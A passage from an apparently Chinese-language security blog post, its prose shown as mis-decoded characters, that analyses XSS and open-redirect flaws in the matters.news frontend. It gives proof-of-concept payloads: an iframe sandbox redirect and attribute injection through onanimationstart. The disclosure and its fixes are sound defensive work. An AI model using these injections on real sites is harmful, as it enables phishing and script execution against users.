class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p>Matters çš„å‰ç«¯ä½¿ç”¨çš„æ˜¯ Reactï¼Œåœ¨ React è£¡é¢æ‰€ render çš„æ±è¥¿é è¨­éƒ½å·²ç¶“ escape éäº†ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šä¸æœƒæœ‰ XSS çš„æ´ã€‚ä½†æœ‰æ™‚å€™æˆ‘å€‘ä¸æƒ³è¦å®ƒéæ¿¾ï¼Œä¾‹å¦‚èªªæ–‡ç« å…§å®¹ï¼Œæˆ‘å€‘å¯èƒ½æœƒéœ€è¦ä¸€äº› tag å¯ä»¥ render æˆ HTMLï¼Œé€™æ™‚å€™å°±å¯ä»¥ç”¨ <code>dangerouslySetInnerHTML</code>ï¼Œå‚³å…¥é€™å€‹çš„æ±è¥¿æœƒç›´æ¥ä»¥ innerHTML çš„æ–¹å¼ render å‡ºä¾†ï¼Œä¸æœƒè¢«éæ¿¾ã€‚</p>\n<p>æ‰€ä»¥ä¸€èˆ¬ä¾†èªªéƒ½æœƒæ¡ç”¨ js-xss + dangerouslySetInnerHTML é€™æ¨£çš„åšæ³•ï¼Œç¢ºä¿ render çš„å…§å®¹å„˜ç®¡æ˜¯ HTMLï¼Œä½†ä¸æœƒè¢« XSSã€‚</p>\n<p>é€™é‚Šåœ¨å‚³å…¥ dangerouslySetInnerHTML ä¹‹å‰å…ˆéäº†ä¸€å€‹å«åš optimizeEmbed çš„å‡½å¼ï¼Œå¯ä»¥ç¹¼çºŒå¾€ä¸‹è¿½ï¼Œçœ‹åˆ° <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/text.ts#L89\">src/common/utils/text.ts</a>ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">optimizeEmbed</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">content<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> content<br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">\\&lt;iframe </span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;iframe loading=\"lazy\"'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><br>      <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;img\\s[^>]*?src\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"][^>]*?></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span><br>      <span class=\"token punctuation\">(</span><span class=\"token parameter\">match<span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">,</span> offset</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> <span class=\"token comment\">/* html */</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;picture><br>        &lt;source<br>          type=\"image/webp\"<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          onerror=\"this.srcset='</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">'\"<br>        /><br>        &lt;source<br>          type=\"image/webp\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>        /><br>        &lt;img<br>          src=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>src<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'540w'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"><br>          loading=\"lazy\"<br>        /><br>      &lt;/picture><br>    </span><span class=\"token template-punctuation string\">`</span></span><br>      <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™é‚Šæ¡ç”¨ RegExp æŠŠ img src æ‹¿å‡ºä¾†ï¼Œç„¶å¾Œç”¨å­—ä¸²æ‹¼æ¥çš„æ–¹å¼ç›´æ¥æ‹¼æˆ HTMLï¼Œå†å¾€ä¸‹çœ‹ <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/url.ts#L49\">toSizedImageURL</a>ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">toSizedImageURL</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token punctuation\">{</span> url<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token operator\">:</span> ToSizedImageURLProps</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">const</span> assetDomain <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><br>    <span class=\"token operator\">?</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">https://</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NEXT_PUBLIC_ASSET_DOMAIN</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><br>    <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br>  <span class=\"token keyword\">const</span> isOutsideLink <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><br>  <span class=\"token keyword\">const</span> isGIF <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">gif</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">i</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><br><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>assetDomain <span class=\"token operator\">||</span> isOutsideLink <span class=\"token operator\">||</span> isGIF<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> url<br>  <span class=\"token punctuation\">}</span><br><br>  <span class=\"token keyword\">const</span> key <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>assetDomain<span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> extedUrl <span class=\"token operator\">=</span> <span class=\"token function\">changeExt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> key<span class=\"token punctuation\">,</span> ext <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">const</span> prefix <span class=\"token operator\">=</span> size <span class=\"token operator\">?</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> <span class=\"token constant\">PROCESSED_PREFIX</span> <span class=\"token operator\">+</span> <span class=\"token string\">'/'</span> <span class=\"token operator\">+</span> size <span class=\"token operator\">:</span> <span class=\"token string\">''</span><br><br>  <span class=\"token keyword\">return</span> assetDomain <span class=\"token operator\">+</span> prefix <span class=\"token operator\">+</span> extedUrl<br><span class=\"token punctuation\">}</span></code></pre>\n<p>åªè¦ domain æ˜¯ assets çš„ domain ä¸¦ç¬¦åˆå…¶ä»–æ¢ä»¶ï¼Œå°±æœƒç¶“éä¸€äº›å­—ä¸²è™•ç†ä¹‹å¾Œå›å‚³ã€‚</p>\n<p>çœ‹åˆ°é€™é‚Šï¼Œå°±å¤§è‡´ä¸Šäº†è§£æ•´å€‹æ–‡ç« çš„ render éç¨‹äº†ã€‚</p>\n<p>æœƒåœ¨ server side ç”¨ js-xss é€™å¥— library é€²è¡Œéæ¿¾ï¼Œåœ¨ client side é€™é‚Šå‰‡æ˜¯ç”¨ dangerouslySetInnerHTML ä¾† renderï¼Œå…¶ä¸­æœƒå…ˆå° img tag åšä¸€äº›è™•ç†ï¼ŒæŠŠ img æ”¹æˆç”¨ picture + source çš„æ–¹å¼é‡å°ä¸åŒè§£æåº¦æˆ–æ˜¯è¢å¹•å°ºå¯¸è¼‰å…¥ä¸åŒçš„åœ–ç‰‡ã€‚</p>\n<p>ä»¥ä¸Šå°±æ˜¯é€™å€‹ç¶²ç«™ render æ–‡ç« çš„æ•´å€‹éç¨‹ï¼Œå†ç¹¼çºŒå¾€ä¸‹çœ‹ä¹‹å‰ä½ å¯ä»¥æƒ³ä¸€ä¸‹ï¼Œæœ‰æ²’æœ‰ä»€éº¼åœ°æ–¹æœ‰å•é¡Œï¼Ÿ</p>\n<p>== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==<br>\n== é˜²é›·åˆ†éš” ==</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%B1%AC%E6%80%A7%E9%81%8E%E6%BF%BE\">#</a> ç¬¬ä¸€å€‹å•é¡Œï¼šéŒ¯èª¤çš„å±¬æ€§éæ¿¾</h2>\n<p>ä½ æœ‰ç™¼ç¾é€™é‚Šçš„éæ¿¾æœ‰å•é¡Œå—ï¼Ÿ</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é–‹æ”¾ iframe æ‡‰è©²æ˜¯å› ç‚ºè¦è®“ä½¿ç”¨è€…å¯ä»¥åµŒå…¥ YouTube å½±ç‰‡ä¹‹é¡çš„æ±è¥¿ï¼Œä½†å•é¡Œæ˜¯é€™å€‹ç¶²ç«™ä¸¦æ²’æœ‰ç”¨ CSP æŒ‡å®šåˆæ³•çš„ domainï¼Œå› æ­¤é€™é‚Šçš„ src å¯ä»¥éš¨æ„äº‚å¡«ï¼Œæˆ‘å¯ä»¥è‡ªå·±åšä¸€å€‹ç¶²ç«™ç„¶å¾Œç”¨ iframe åµŒå…¥ã€‚å¦‚æœç¶²é å…§å®¹è¨­è¨ˆå¾—å¥½ï¼Œçœ‹èµ·ä¾†å°±æœƒæ˜¯é€™å€‹ç¶²ç«™æœ¬èº«çš„ä¸€éƒ¨åˆ†ï¼š</p>\n<p><img src=\"https://i.imgur.com/rivVdiC.png\" alt=\"\"></p>\n<p>ä»¥ä¸Šåªæ˜¯éš¨ä¾¿å¡«çš„ä¸€å€‹ç¯„ä¾‹ï¼Œä¸»è¦æ˜¯è®“å¤§å®¶çœ‹å€‹æ„Ÿè¦ºï¼Œå¦‚æœçœŸçš„æœ‰å¿ƒæƒ³æ”»æ“Šçš„è©±å¯ä»¥å¼„å¾—æ›´ç²¾ç·»ï¼Œå…§å®¹æ›´å¸å¼•äººã€‚</p>\n<p>å¦‚æœåªæ˜¯é€™æ¨£çš„è©±ï¼Œæ”»æ“Šèƒ½å¦æˆåŠŸå–æ±ºèˆ‡å…§å®¹æ˜¯å¦èƒ½å¤ å–ä¿¡æ–¼ä½¿ç”¨è€…ã€‚ä½†å…¶å¯¦å¯ä»¥åšåˆ°çš„ä¸åªé€™æ¨£ï¼Œå¤§å®¶çŸ¥é“åœ¨ iframe è£¡é¢æ˜¯å¯ä»¥æ“æ§å¤–é¢çš„ç¶²ç«™å—ï¼Ÿ</p>\n<p>cross origin çš„ window ä¹‹é–“èƒ½å­˜å–çš„æ±è¥¿æœ‰é™ï¼Œå”¯ä¸€èƒ½å¤ æ”¹è®Šçš„æ˜¯ <code>location</code> é€™å€‹æ±è¥¿ï¼Œæ„æ€å°±æ˜¯æˆ‘å€‘å¯ä»¥åœ¨ iframe è£¡é¢ï¼ŒæŠŠåµŒå…¥ä½ çš„ç¶²ç«™é‡æ–°å°å‘ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>  top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> <span class=\"token string\">'https://google.com'</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é€™æ¨£åšçš„è©±ï¼Œæˆ‘å°±å¯ä»¥æŠŠæ•´å€‹ç¶²ç«™é‡æ–°å°å‘åˆ°ä»»ä½•åœ°æ–¹ï¼Œä¸€å€‹æœ€ç°¡å–®èƒ½æƒ³åˆ°çš„æ‡‰ç”¨å°±æ˜¯é‡æ–°å°å‘åˆ°é‡£é­šç¶²ç«™ã€‚é€™æ¨£çš„é‡£é­šç¶²ç«™æˆåŠŸæ©Ÿç‡æ˜¯æ¯”è¼ƒé«˜çš„ï¼Œå› ç‚ºä½¿ç”¨è€…å¯èƒ½æ ¹æœ¬æ²’æœ‰æ„è­˜åˆ°ä»–è¢«é‡æ–°å°å‘åˆ°å…¶ä»–ç¶²ç«™äº†ã€‚</p>\n<p>å…¶å¯¦ç€è¦½å™¨é‡å°é€™æ¨£çš„é‡æ–°å°å‘æ˜¯æœ‰é˜²ç¦¦çš„ï¼Œä¸Šé¢çš„ç¨‹å¼ç¢¼æœƒå‡ºç¾éŒ¯èª¤ï¼š</p>\n<blockquote>\n<p>Unsafe attempt to initiate navigation for frame with origin '<a href=\"https://matters.news\">https://matters.news</a>' from frame with URL '<a href=\"https://53469602917d.ngrok.io/\">https://53469602917d.ngrok.io/</a>'. The frame attempting navigation is targeting its top-level window, but is neither same-origin with its target nor has it received a user gesture. See <a href=\"https://www.chromestatus.com/features/5851021045661696\">https://www.chromestatus.com/features/5851021045661696</a>.</p>\n</blockquote>\n<blockquote>\n<p>Uncaught DOMException: Failed to set the 'href' property on 'Location': The current window does not have permission to navigate the target frame to '<a href=\"https://google.com\">https://google.com</a>'</p>\n</blockquote>\n<p>å› ç‚ºä¸æ˜¯ same originï¼Œæ‰€ä»¥æœƒé˜»æ­¢ iframe å° top level window åšå°å‘ã€‚</p>\n<p>ä½†æ˜¯å‘¢ï¼é€™å€‹æ±è¥¿æ˜¯å¯ä»¥ç¹éçš„ï¼Œæœƒé‹ç”¨åˆ° sandbox é€™å€‹å±¬æ€§ã€‚é€™å€‹å±¬æ€§å…¶å¯¦å°±æ˜¯åœ¨æŒ‡å®šåµŒå…¥çš„ iframe æœ‰ä»€éº¼æ¬Šé™ï¼Œæ‰€ä»¥åªè¦æ”¹æˆï¼š<code>&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-same-origin&quot; src=example.com&gt;&lt;/iframe&gt;</code>ï¼Œå°±å¯ä»¥æˆåŠŸå° top level window é‡æ–°å°å‘ï¼ŒæŠŠæ•´å€‹ç¶²ç«™çµ¦å°èµ°ã€‚</p>\n<p>é€™å€‹æ¼æ´åœ¨ <a href=\"https://ruvlol.medium.com/1000-for-open-redirect-via-unknown-technique-675f5815e38a\">GitLab</a> èˆ‡ <a href=\"https://github.com/hackmdio/codimd/issues/1263\">codimd</a> éƒ½æœ‰å‡ºç¾éã€‚</p>\n<p>é€™é‚Šçš„ä¿®æ­£æ–¹å¼æœ‰å¹¾å€‹ï¼Œç¬¬ä¸€å€‹æ˜¯å¯ä»¥å…ˆæŠŠ sandbox é€™å€‹å±¬æ€§æ‹¿æ‰ï¼Œè®“é€™å€‹å±¬æ€§ä¸èƒ½è¢«ä½¿ç”¨ã€‚å¦‚æœçœŸçš„æœ‰åœ°æ–¹éœ€è¦ç”¨åˆ°çš„è©±ï¼Œå°±éœ€è¦æª¢æŸ¥è£¡é¢çš„å€¼ï¼ŒæŠŠæ¯”è¼ƒå±éšªçš„ <code>allow-top-navigation</code> çµ¦æ‹¿æ‰ã€‚</p>\n<p>å†ä¾†çš„è©±ä¹Ÿå¯ä»¥é™åˆ¶ iframe src çš„ä½ç½®ï¼Œå¯ä»¥åœ¨ä¸åŒå±¤é¢åšæ‰ï¼Œä¾‹å¦‚èªªåœ¨ç¨‹å¼ç¢¼è£¡é¢è‡ªå·±éæ¿¾ srcï¼Œåªå…è¨±ç‰¹å®š domainï¼Œæˆ–è€…æ˜¯ç”¨ <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-src\">CSP:frame-src</a> è®“ç€è¦½å™¨æŠŠé€™äº›ä¸ç¬¦åˆçš„ domain è‡ªå·±æ“‹æ‰ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E5%80%8B%E5%95%8F%E9%A1%8C%EF%BC%9A%E6%9C%AA%E9%81%8E%E6%BF%BE%E7%9A%84-html\">#</a> ç¬¬äºŒå€‹å•é¡Œï¼šæœªéæ¿¾çš„ HTML</h2>\n<p>ç¬¬ä¸€å€‹å•é¡Œèƒ½é€ æˆæœ€å¤§çš„å±éšªå¤§æ¦‚å°±æ˜¯é‡æ–°å°å‘äº†ï¼ˆcodimd é‚£ä¸€ç¯‡æ˜¯èªªåœ¨ Safari å¯ä»¥åšå‡º XSS å•¦ï¼Œåªæ˜¯æˆ‘åšä¸å‡ºä¾† QQï¼‰ï¼Œä½†æ˜¯é™¤äº†é€™å€‹ä¹‹å¤–ï¼Œé‚„æœ‰ä¸€å€‹æ›´å¤§çš„å•é¡Œï¼Œé‚£å°±æ˜¯é€™é‚Šï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p><code>article.content</code> æ˜¯ç¶“é js-xss éæ¿¾å¾Œçš„ HTML å­—ä¸²ï¼Œæ‰€ä»¥æ˜¯å®‰å…¨çš„ï¼Œä½†é€™é‚Šç¶“éäº†ä¸€å€‹ <code>optimizeEmbed</code> å»åšè‡ªè¨‚çš„è½‰æ›ï¼Œåœ¨éæ¿¾ä»¥å¾Œé‚„å»æ”¹è®Šå…§å®¹å…¶å¯¦æ˜¯ä¸€ä»¶æ¯”è¼ƒå±éšªçš„äº‹ï¼Œå› ç‚ºå¦‚æœè™•ç†çš„éç¨‹æœ‰ç–å¿½ï¼Œå°±æœƒé€ æˆ XSS çš„æ¼æ´ã€‚</p>\n<p>åœ¨è½‰æ›è£¡é¢æœ‰ä¸€æ®µç¨‹å¼ç¢¼ç‚ºï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>${toSizedImageURL({</span> <span class=\"token attr-name\"><span class=\"token namespace\">url:</span></span> <span class=\"token attr-name\">src,</span> <span class=\"token attr-name\"><span class=\"token namespace\">size:</span></span> <span class=\"token attr-name\">'1080w',</span> <span class=\"token attr-name\"><span class=\"token namespace\">ext:</span></span> <span class=\"token attr-name\">'webp'</span> <span class=\"token attr-name\">})}</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>srcset<span class=\"token operator\">=</span><span class=\"token string\">'${src}'</span></span><span class=\"token punctuation\">\"</span></span></span><br><span class=\"token punctuation\">/></span></span></code></pre>\n<p>ä»”ç´°çœ‹é€™æ®µç¨‹å¼ç¢¼ï¼Œå¦‚æœ <code>${toSizedImageURL({ url: src, size: '1080w', ext: 'webp' })}</code> æˆ–æ˜¯ <code>src</code> æˆ‘å€‘å¯ä»¥æ§åˆ¶çš„è©±ï¼Œå°±æœ‰æ©Ÿæœƒèƒ½å¤ æ”¹è®Šå±¬æ€§çš„å…§å®¹ï¼Œæˆ–è€…æ˜¯æ–°å¢å±¬æ€§ä¸Šå»ã€‚</p>\n<p>æˆ‘åŸæœ¬æƒ³æ’å…¥ä¸€å€‹æƒ¡æ„çš„ src è®“ onerror è®Šæˆ <code>onerror=&quot;this.srcset='test';alert(1)&quot;</code> ä¹‹é¡çš„ç¨‹å¼ç¢¼ï¼Œä½†æˆ‘å¾Œä¾†ç™¼ç¾ picture åº•ä¸‹çš„ source çš„ onerror äº‹ä»¶å¥½åƒæ˜¯ç„¡æ•ˆçš„ï¼Œå°±ç®— srcset æœ‰éŒ¯ä¹Ÿä¸æœƒè§¸ç™¼ï¼Œæ‰€ä»¥æ˜¯æ²’ç”¨çš„ã€‚</p>\n<p>å› æ­¤æˆ‘å°±æŠŠç„¦é»è½‰å‘ srcSet ä»¥åŠæ’å…¥æ–°çš„å±¬æ€§ï¼Œé€™é‚Šå¯ä»¥ç”¨ <code>onanimationstart</code> é€™å€‹å±¬æ€§ï¼Œåœ¨ animation é–‹å§‹æ™‚æœƒè§¸ç™¼çš„ä¸€å€‹äº‹ä»¶ï¼Œè€Œ animation çš„åå­—å¯ä»¥å» CSS è£¡é¢æ‰¾ï¼Œå¾ˆå¹¸é‹åœ°æ‰¾åˆ°äº†ä¸€å€‹ keyframe å«åš<code>spinning</code>ã€‚</p>\n<p>å› æ­¤å¦‚æœ img src ç‚ºï¼š<code>https://assets.matters.news/processed/1080w/embed/test style=animation-name:spinning onanimationstart=console.log(1337)</code></p>\n<p>çµåˆå¾Œçš„ç¨‹å¼ç¢¼å°±æ˜¯ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span><br>  <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/webp<span class=\"token punctuation\">\"</span></span><br>  <span class=\"token attr-name\">media</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>(min-width: 768px)<span class=\"token punctuation\">\"</span></span>   <br>  <span class=\"token attr-name\">srcSet</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>https://assets.matters.news/processed/1080w/embed/test</span> <br>  <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value css language-css\"><span class=\"token property\">animation-name</span><span class=\"token punctuation\">:</span>spinning</span></span></span> <br>  <span class=\"token attr-name\">onanimationstart</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>console.log(1337)</span><br>  <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span 